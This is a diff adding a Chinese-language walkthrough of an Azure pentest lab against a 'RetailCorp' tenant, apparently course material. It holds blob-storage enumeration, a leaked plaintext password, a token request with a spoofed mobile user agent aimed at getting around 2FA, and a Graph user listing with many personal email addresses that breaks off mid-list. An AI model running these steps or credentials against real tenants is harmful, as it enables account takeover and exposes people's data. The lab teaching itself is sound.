@@ -10,10 +10,1733 @@ This course is designed for security professionals, penetration testers, and tho
 
 ## Solution Process
 
-首先，已知 `RetailCorp` 名称的前提下，枚举其子域名
+首先，使用 MicroBrust 工具包之前，需要导入模块
 
 ```powershell
+PS D:\_Tools\MicroBurst> Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1
 
+AzureRM module not installed, checking other modules
+
+MSOnline module not installed, checking other modules
+
+Imported Misc MicroBurst functions
+
+Imported Azure REST API MicroBurst functions
+```
+
+### Discovery - 发现
+
+已知 `RetailCorp` 名称的前提下，枚举其子域名
+
+```powershell
+Invoke-EnumerateAzureSubDomains -Base retailcorp
+```
+
+![img](img/image_20260116-201659.png)
+
+很明显，由于相关的结果过多，导致无法直接使用命令行进行枚举
+
+可以尝试使用接口
+
+```plaintext
+# 枚举基本信息
+https://login.microsoftonline.com/getuserrealm.srf?login=USERNAME@retailcorp.onmicrosoft.com&xml=1
+
+# 枚举租户编号
+https://login.microsoftonline.com/retailcorp.onmicrosoft.com/.well-known/openid-configuration
+```
+
+可以获得：
+
+- `Domain of the RetailCorp tenant` - `retailcorp.onmicrosoft.com`
+- `Tenant ID of the RetailCorp tenant` - `711c59fe-8dee-40c0-adc1-ed08f738de43`
+
+### Initial Access - 初始访问
+
+接下来尝试枚举这个租户的公开，或者可匿名访问的对象
+
+```powershell
+Invoke-EnumerateAzureBlobs -Base retailcorp
+```
+
+同样，存在有大量的干扰项
+
+![img](img/image_20260125-202529.png)
+
+<details>
+
+<summary> 完整执行结果 </summary>
+
+```powershell
+PS D:\_Tools\MicroBurst> Invoke-EnumerateAzureBlobs -Base retailcorp
+Found Storage Account - retailcorp.blob.core.windows.net
+Found Storage Account -  access-logsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpaccess-logs.blob.core.windows.net
+Found Storage Account -  accountingretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpaccounting.blob.core.windows.net
+Found Storage Account -  apiretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpapi.blob.core.windows.net
+Found Storage Account -  assetsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpassets.blob.core.windows.net
+Found Storage Account -  azureretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpazure.blob.core.windows.net
+Found Storage Account -  azure-logsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpazure-logs.blob.core.windows.net
+Found Storage Account -  chefretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpchef.blob.core.windows.net
+Found Storage Account -  clientretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpclient.blob.core.windows.net
+Found Storage Account -  confretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpconf.blob.core.windows.net
+Found Storage Account -  confidentialretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpconfidential.blob.core.windows.net
+Found Storage Account -  configretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpconfig.blob.core.windows.net
+Found Storage Account -  configurationretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpconfiguration.blob.core.windows.net
+Found Storage Account -  contentretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpcontent.blob.core.windows.net
+Found Storage Account -  customerretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpcustomer.blob.core.windows.net
+Found Storage Account -  dataretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdata.blob.core.windows.net
+Found Storage Account -  databaseretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdatabase.blob.core.windows.net
+Found Storage Account -  data-privateretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdata-private.blob.core.windows.net
+Found Storage Account -  data-publicretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdata-public.blob.core.windows.net
+Found Storage Account -  devretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdev.blob.core.windows.net
+Found Storage Account -  developmentretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdevelopment.blob.core.windows.net
+Found Storage Account -  demoretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdemo.blob.core.windows.net
+Found Storage Account -  dnsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdns.blob.core.windows.net
+Found Storage Account -  dockerretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpdocker.blob.core.windows.net
+Found Storage Account -  exeretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpexe.blob.core.windows.net
+Found Storage Account -  filesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpfiles.blob.core.windows.net
+Found Storage Account -  filestorageretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpfilestorage.blob.core.windows.net
+Found Storage Account -  financeretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpfinance.blob.core.windows.net
+Found Storage Account -  githubretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpgithub.blob.core.windows.net
+Found Storage Account -  gitlabretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpgitlab.blob.core.windows.net
+Found Storage Account -  hiddenretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorphidden.blob.core.windows.net
+Found Storage Account -  hrretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorphr.blob.core.windows.net
+Found Storage Account -  imagesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpimages.blob.core.windows.net
+Found Storage Account -  internalretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpinternal.blob.core.windows.net
+Found Storage Account -  internal-distretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpinternal-dist.blob.core.windows.net
+Found Storage Account -  internal-reporetailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpinternal-repo.blob.core.windows.net
+Found Storage Account -  itretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpit.blob.core.windows.net
+Found Storage Account -  jenkinsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpjenkins.blob.core.windows.net
+Found Storage Account -  keyretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpkey.blob.core.windows.net
+Found Storage Account -  keysretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpkeys.blob.core.windows.net
+Found Storage Account -  logsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorplogs.blob.core.windows.net
+Found Storage Account -  myretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpmy.blob.core.windows.net
+Found Storage Account -  photosretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpphotos.blob.core.windows.net
+Found Storage Account -  privateretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpprivate.blob.core.windows.net
+Found Storage Account -  processedretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpprocessed.blob.core.windows.net
+Found Storage Account -  prodretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpprod.blob.core.windows.net
+Found Storage Account -  productionretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpproduction.blob.core.windows.net
+Found Storage Account -  productcontentretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpproductcontent.blob.core.windows.net
+Found Storage Account -  productretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpproduct.blob.core.windows.net
+Found Storage Account -  publicretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorppublic.blob.core.windows.net
+Found Storage Account -  qaretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpqa.blob.core.windows.net
+Found Storage Account -  reporetailcorp.blob.core.windows.net
+Found Storage Account -  retailcorprepo.blob.core.windows.net
+Found Storage Account -  reporetailcorp.blob.core.windows.net
+Found Storage Account -  retailcorprepo.blob.core.windows.net
+Found Storage Account -  rootretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorproot.blob.core.windows.net
+Found Storage Account -  secretretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsecret.blob.core.windows.net
+Found Storage Account -  secretsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsecrets.blob.core.windows.net
+Found Storage Account -  serviceretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpservice.blob.core.windows.net
+Found Storage Account -  servicesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpservices.blob.core.windows.net
+Found Storage Account -  siteretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsite.blob.core.windows.net
+Found Storage Account -  slidesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpslides.blob.core.windows.net
+Found Storage Account -  splunkretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsplunk.blob.core.windows.net
+Found Storage Account -  sqlretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsql.blob.core.windows.net
+Found Storage Account -  sql-logsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpsql-logs.blob.core.windows.net
+Found Storage Account -  sshretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpssh.blob.core.windows.net
+Found Storage Account -  stagingretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpstaging.blob.core.windows.net
+Found Storage Account -  storageretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpstorage.blob.core.windows.net
+Found Storage Account -  storageaccountretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpstorageaccount.blob.core.windows.net
+Found Storage Account -  testretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorptest.blob.core.windows.net
+Found Storage Account -  tmpretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorptmp.blob.core.windows.net
+Found Storage Account -  tmp-logsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorptmp-logs.blob.core.windows.net
+Found Storage Account -  themesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpthemes.blob.core.windows.net
+Found Storage Account -  useastretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpuseast.blob.core.windows.net
+Found Storage Account -  useast2retailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpuseast2.blob.core.windows.net
+Found Storage Account -  centralusretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpcentralus.blob.core.windows.net
+Found Storage Account -  northcentralusretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpnorthcentralus.blob.core.windows.net
+Found Storage Account -  westcentralusretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpwestcentralus.blob.core.windows.net
+Found Storage Account -  westusretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpwestus.blob.core.windows.net
+Found Storage Account -  westus2retailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpwestus2.blob.core.windows.net
+Found Storage Account -  userfilesretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpuserfiles.blob.core.windows.net
+Found Storage Account -  webretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpweb.blob.core.windows.net
+Found Storage Account -  attachmentsretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpattachments.blob.core.windows.net
+Found Storage Account -  imgretailcorp.blob.core.windows.net
+Found Storage Account -  retailcorpimg.blob.core.windows.net
+
+Found Container - retailcorp.blob.core.windows.net/configuration
+```
+
+</details>
+
+已知 `retailcorp.blob.core.windows.net/configuration` 容器是可以未授权访问的前提下，直接使用 `Microsoft Azure Storage Explorer` 进行查看
+
+![img](img/image_20260147-204758.png)
+
+```powershell title="PAS_Deployment_Script.ps1"
+$password = ConvertTo-SecureString 'ZuqK&ijv0085VnCI&#' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('PIMUser@retailcorp.onmicrosoft.com', $Password)
+Connect-AzAccount -Credential $Cred
+
+$resourceGroup = "PIMManagement"
+$location = "Germany West Central"
+$vmName = "PAS"
+$Subscription = "27ebe5b9-6e27-425a-8117-eeaab022575f"
+
+# Set a variable for the image version in Tenant 1 using the full image ID of the image version
+$image = "/subscriptions/$Subscription/resourceGroups/$resourceGroup/providers/Microsoft.Compute/galleries/PIM/images/PAS/versions/2.0"
+
+# Create user object
+$cred = Get-Credential -Message "Enter a username and password for the virtual machine."
+
+# Create a resource group
+New-AzResourceGroup -Name $resourceGroup -Location $location
+
+# Networking pieces
+$subnetConfig = New-AzVirtualNetworkSubnetConfig -Name mySubnet -AddressPrefix 192.168.1.0/24
+$vnet = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $location `
+  -Name MYvNET -AddressPrefix 192.168.0.0/16 -Subnet $subnetConfig
+$pip = New-AzPublicIpAddress -ResourceGroupName $resourceGroup -Location $location `
+  -Name "mypublicdns$(Get-Random)" -AllocationMethod Static -IdleTimeoutInMinutes 4
+$nsgRuleRDP = New-AzNetworkSecurityRuleConfig -Name myNetworkSecurityGroupRuleRDP  -Protocol Tcp `
+  -Direction Inbound -Priority 1000 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
+  -DestinationPortRange 3389 -Access Allow
+$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $resourceGroup -Location $location `
+  -Name myNetworkSecurityGroup -SecurityRules $nsgRuleRDP
+$nic = New-AzNetworkInterface -Name myNic -ResourceGroupName $resourceGroup -Location $location `
+  -SubnetId $vnet.Subnets[0].Id -PublicIpAddressId $pip.Id -NetworkSecurityGroupId $nsg.Id
+
+# Create a virtual machine configuration using the $image variable to specify the image
+$vmConfig = New-AzVMConfig -VMName $vmName -VMSize Standard_D1_v2 | `
+Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $cred | `
+Set-AzVMSourceImage -Id $image | `
+Add-AzVMNetworkInterface -Id $nic.Id
+
+# Create a virtual machine
+New-AzVM -ResourceGroupName $resourceGroup -Location $location -VM $vmConfig
+```
+
+可以获得：
+
+- `Name of the publicly readable container in RetailCorp tenant` - `configuration`
+- `Name of the PowerShell script available in the publicly readable container` - `PAS_Deployment_Script.ps1`
+
+### Enumeration - 枚举
+
+为了绕过 2FA 登陆限制，尝试以移动端设备的角色申请 access token 来进行访问
+
+```powershell
+$body = @{
+    client_id     = "1b730954-1685-4b74-9bfd-dac224a7b894"
+    scope         = "https://graph.microsoft.com/.default"
+    username      = "PIMUser@retailcorp.onmicrosoft.com"
+    password      = 'ZuqK&ijv0085VnCI&#'
+    grant_type    = "password"
+}
+$userAgent = "Mozilla/5.0 (Linux; Android 12; RMX3491) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
+$res = Invoke-RestMethod -Uri "https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/v2.0/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $userAgent
+$token = ($res.access_token)
+Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)
+```
+
+执行结果：
+
+```powershell
+PS D:\_Tools\MicroBurst> $body = @{
+>>     client_id     = "1b730954-1685-4b74-9bfd-dac224a7b894"
+>>     scope         = "https://graph.microsoft.com/.default"
+>>     username      = "PIMUser@retailcorp.onmicrosoft.com"
+>>     password      = 'ZuqK&ijv0085VnCI&#'
+>>     grant_type    = "password"
+>> }
+PS D:\_Tools\MicroBurst> $userAgent = "Mozilla/5.0 (Linux; Android 12; RMX3491) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
+PS D:\_Tools\MicroBurst> $res = Invoke-RestMethod -Uri "https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/v2.0/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $userAgent
+PS D:\_Tools\MicroBurst> $token = ($res.access_token)
+PS D:\_Tools\MicroBurst> Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)
+Welcome to Microsoft Graph!
+
+Connected via userprovidedaccesstoken access using 1b730954-1685-4b74-9bfd-dac224a7b894
+Readme: https://aka.ms/graph/sdk/powershell
+SDK Docs: https://aka.ms/graph/sdk/powershell/docs
+API Docs: https://aka.ms/graph/docs
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+NOTE: Sign in by Web Account Manager (WAM) is enabled by default on Windows systems and cannot be disabled. Any setting stating otherwise will be ignored.
+```
+
+在已经获得 access token 的情况下，枚举基本信息
+
+```powershell
+# 枚举用户
+Get-MgUser -All
+
+# 枚举组
+Get-MgGroup -All 
+```
+
+执行结果：
+
+<details>
+
+<summary> 完整执行结果 </summary>
+
+```plaintext
+# 枚举用户
+PS D:\_Tools\MicroBurst> Get-MgUser -All
+
+DisplayName            Id                                   Mail                                                    UserPrincipalName
+-----------            --                                   ----                                                    -----------------
+InvitedAttacker1       09bda90f-83d2-4b23-a512-7fa0a0ed6018 aaaaaaaaa123pim123@hotmail.com                          aaaaaaaaa123pim123_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                30364c3a-5110-4973-9af5-0e1ffca596c7 abcybasil@abcyb.onmicrosoft.com                         abcybasil_abcyb.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Att1                   4233d74b-c9c1-4144-99f1-84d24610de10 abhijitacharya793@gmail.com                             abhijitacharya793_gmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker123444  d7ac0040-ff75-4155-b585-a9aacb697e94 abhijitspatil619@outlook.com                            abhijitspatil619_outlook.com#EXT#@retailcorp.onmicrosoft.com
+abusepim               909380cc-bb5c-46ab-863e-52bbf5209908 abusepimadmin@robertaaron.onmicrosoft.com               abusepimadmin_robertaaron.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                8ec3e815-2e2d-4309-b7d9-5c3bbc0c5851 adarshvs@0xnullsec.onmicrosoft.com                      adarshvs_0xnullsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Adele Vance            c8f0afce-0932-4e00-b28b-7d3053a76a37 AdeleV@4vd3j7.onmicrosoft.com                           AdeleV_4vd3j7.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       c487bff4-0481-4beb-8448-e3d794a6ef05 adm_pim_12@outlook.com                                  adm_pim_12_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Gonzalo Aguilar        c6739d48-75f6-4eb9-8488-896739f1ebd7 admin@6h4ackdomain.onmicrosoft.com                      admin_6h4ackdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                1710a052-799e-41b3-9cc1-897aea5036a2 admin@abpatil.onmicrosoft.com                           admin_abpatil.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Gaurav Anand           5f34313a-0761-464d-a2c0-77d46ab51f50 admin@adminpentesterhero.onmicrosoft.com                admin_adminpentesterhero.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+SUPRIYO SARKAR         2c63687a-bb1e-4d0f-b7ad-4282bc5de834 admin@adpentest.onmicrosoft.com                         admin_adpentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ahmed Kamal            41351980-e72c-44c0-85f5-2b80eba0bbd8 Admin@akamal.onmicrosoft.com                            Admin_akamal.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Avinash Borse          994d5d4e-c572-4e8f-8746-90a3ea11d13e admin@aviborse.onmicrosoft.com                          admin_aviborse.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ayush Adhikari         ccf2ba7d-c52b-4db2-8b81-d092abd1f9c2 admin@ayushadhikari.onmicrosoft.com                     admin_ayushadhikari.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+David Wordliczek       5bed9164-8609-49c0-9c25-30ab1953c9a1 admin@azpentestsecurity.onmicrosoft.com                 admin_azpentestsecurity.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Prashant Gaurav        9e35f173-48d8-4037-8ce5-d3941f19388c admin@azurepttest.onmicrosoft.com                       admin_azurepttest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pragya johari          9e11f146-2347-46e0-b15d-5330a1dd236e admin@azurettesting12345.onmicrosoft.com                admin_azurettesting12345.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+ฉัตรดนัย สิงห์โต       44b81a7d-8bab-4f9c-9a39-e06aca2a552f admin@brackhak.onmicrosoft.com                          admin_brackhak.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Chew Zhi               5c5b4c95-cafe-4fec-bbc1-eab2555a7886 admin@chewzhichao.onmicrosoft.com                       admin_chewzhichao.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                beeaee36-336b-40e3-b427-bf1363a49226 admin@con1s3.onmicrosoft.com                            admin_con1s3.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                2764a1a8-a902-41b2-bd63-68622732443a admin@cyberm4nny.onmicrosoft.com                        admin_cyberm4nny.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ebin sebastian         f68840ec-3648-43ef-a033-e85aa1416150 admin@djzeus.onmicrosoft.com                            admin_djzeus.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Saravana Kumar         9b74f7b5-ab77-4dd2-8d0b-f1be9ab836c1 admin@empirecorp.onmicrosoft.com                        admin_empirecorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                2a60f790-f7ab-4606-9bcf-daf3badb7476 admin@exploringazure2.onmicrosoft.com                   admin_exploringazure2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                4dc06a52-d146-41ab-836a-61cdbef8c275 admin@giovannonacoscialunga.onmicrosoft.com             admin_giovannonacoscialunga.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                686b3b3f-a68f-4795-80e9-561076524b2e admin@gonnahack.onmicrosoft.com                         admin_gonnahack.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Nagendrra C            0b33505b-b8b3-4ae9-9fa1-c42edfa4c8d9 admin@heliikopter.onmicrosoft.com                       admin_heliikopter.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+David Alves            798859cd-3cd2-4d27-9afc-f826b4a4d403 admin@introtocartp.onmicrosoft.com                      admin_introtocartp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+soubhikADPT            b3bbbf61-c5ba-4844-aa1f-2cba3a63637c admin@learnadpt.onmicrosoft.com                         admin_learnadpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Archit Aggarwal        82965bf1-daf2-4acc-9a23-13c36516811b admin@mynewdomainarchit.onmicrosoft.com                 admin_mynewdomainarchit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Umer Farooq            6b494e20-76cd-4fa1-942e-92d9ed593a92 admin@myomerdomain.onmicrosoft.com                      admin_myomerdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                d92f833f-fabd-4a3c-8af5-e46da1fefbf5 admin@naxxramascorp.onmicrosoft.com                     admin_naxxramascorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Admin                  fd1e7795-1173-4ba1-915e-0e436a5db755 admin@nemesisdemo.onmicrosoft.com                       admin_nemesisdemo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Nithiya Shri M         a8044f86-1d26-4cba-b50a-6a7a1706771e admin@nithzz.onmicrosoft.com                            admin_nithzz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+acey acey              499c92de-17f4-4d6e-bb47-5cd11c351a2b admin@notevilcorp.onmicrosoft.com                       admin_notevilcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Utpal Ojha             1c2598c1-ec69-4648-a749-dc37c288c3e7 admin@ojhauk.onmicrosoft.com                            admin_ojhauk.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Shwetha Reddy          4131274c-d9aa-4115-ace9-8ad5e285571e admin@pentester2014.onmicrosoft.com                     admin_pentester2014.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                11f8f7a6-7595-4b3f-8bb5-74cc4644b42b admin@redteam777.onmicrosoft.com                        admin_redteam777.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Robert Aaron           67c985d0-291b-4fe1-af08-e6f0ca0c40f8 admin@robertaaron.onmicrosoft.com                       admin_robertaaron.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+admin                  dd4c29e6-ae89-45a1-b116-c978b65606b4 admin@rougedomain.onmicrosoft.com                       admin_rougedomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ross Moore             8b755706-5a93-4134-bd72-cd79bb8ef509 admin@securitychat.onmicrosoft.com                      admin_securitychat.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Avinash Sharma         b438e623-e5e1-47ba-b22c-b14ca2b5a31c admin@securityowl.onmicrosoft.com                       admin_securityowl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                2d2802ab-020b-463e-b1e1-70a80f4c4986 admin@shiva8944.onmicrosoft.com                         admin_shiva8944.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Sandeep Singh          75cded7b-f1b4-40e6-a0b1-45b8a4ca53b5 admin@snouyt.onmicrosoft.com                            admin_snouyt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                965c7e26-18e2-4454-a51c-118adaff56c2 admin@wdssa.onmicrosoft.com                             admin_wdssa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       1033e9d6-f458-443f-b6df-ac0d7932d348 admin@azuremvapt.onmicrosoft.com                        admin_azuremvapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       57fe1a9b-927d-4cbf-b2e1-948dcd62a59b admin@azurevapt.onmicrosoft.com                         admin_azurevapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+JPAttacker             faca4d80-e954-42d2-af05-3a0523e61d41 admin@pitcairntest.onmicrosft.com                       admin_pitcairntest.onmicrosft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e16d21ad-228e-4064-8c9f-9d84b4b2e0e7 admin@priyanka0109.onmicrosoft.com                      admin_priyanka0109.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Notahacker             fb884aff-7602-4d5f-bad6-c9e783c785c5 admin@securityowl.onmicrosoft.cp                        admin_securityowl.onmicrosoft.cp#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       ae1ddbdc-0238-4401-b516-b43a9ea885e6 admin@thehackingfactory.onmicrosoft.com                 admin_thehackingfactory.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a5fc251a-6f77-4515-90e7-2f1043ef2fe8 admin@w00daz.onmicrosoft.com                            admin_w00daz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Sabrina Lupsan         45a36dad-f6d6-4f2d-9730-faa97602689c adminoperations@sabrinasdomain.onmicrosoft.com          adminoperations_sabrinasdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                61c47563-7d4e-462a-972f-d738950b6857 alex@4v61rc.onmicrosoft.com                             alex_4v61rc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Alexander S Evans      d19c7b88-f0dd-48e4-9c27-e2b6e15bc696                                                         AlexanderSEvans@retailcorp.onmicrosoft.com
+Alex J Allen           7b1c09cd-2552-4d3d-b65b-13fb7baa8961                                                         AlexJAllen@retailcorp.onmicrosoft.com
+Alfred P Fleming       77539ddc-6856-4c3d-8967-1cb6efaa6470                                                         AlfredPFleming@retailcorp.onmicrosoft.com
+Ali Hossam             5f348a27-d3bc-4abf-bee0-c3e512c27122 alipim@testedcorp.onmicrosoft.com                       alipim_testedcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Andrew H Carnes        a84c8225-3c31-4fd5-8581-3a362886dab5                                                         AndrewHCarnes@retailcorp.onmicrosoft.com
+Andrew M Edwards       b4ff45fe-7535-4e8c-be27-f70ecc6e726e                                                         AndrewMEdwards@retailcorp.onmicrosoft.com
+Anna C House           e0b308bd-c5da-45f4-92e6-690a5d943a7e                                                         AnnaCHouse@retailcorp.onmicrosoft.com
+Anthony S Duran        b974968d-2cf9-4aa7-beb5-abe8032eae2f                                                         AnthonySDuran@retailcorp.onmicrosoft.com
+Antonio K Bell         4510cd10-1766-45ac-b247-ee44c8968d16                                                         AntonioKBell@retailcorp.onmicrosoft.com
+ar7pim                 a4089f44-8a20-4e6d-9ce4-38c08abcb302 ar7pim@rezur.onmicrosoft.com                            ar7pim_rezur.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+ar7pim                 be6f86dd-4a08-4b9d-8bce-5404236a700c ar7pim@amitroylawrencian2gmail.onmicrosoft.com          ar7pim_amitroylawrencian2gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Arthur J Randall       deb96599-f2a2-4e17-affb-179c1d8f411a                                                         ArthurJRandall@retailcorp.onmicrosoft.com
+Attacker1              5e526f00-a52c-41e4-98ca-ee2a6d1d9d9b att@1.onmicrosoft.com                                   att_1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Aredteam Tester        daa96de8-c81c-4c03-919d-af0584a3cb0d attacker@shaxity.onmicrosoft.com                        attacker_shaxity.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attackerpimadmin       a5613935-4e8e-4793-982f-056c22ccb266 attackerpimadmin@xplo1tsec.onmicrosoft.com              attackerpimadmin_xplo1tsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Audra A Winslow        db011b0a-d52b-4a9f-8809-c3956e6b9c47                                                         AudraAWinslow@retailcorp.onmicrosoft.com
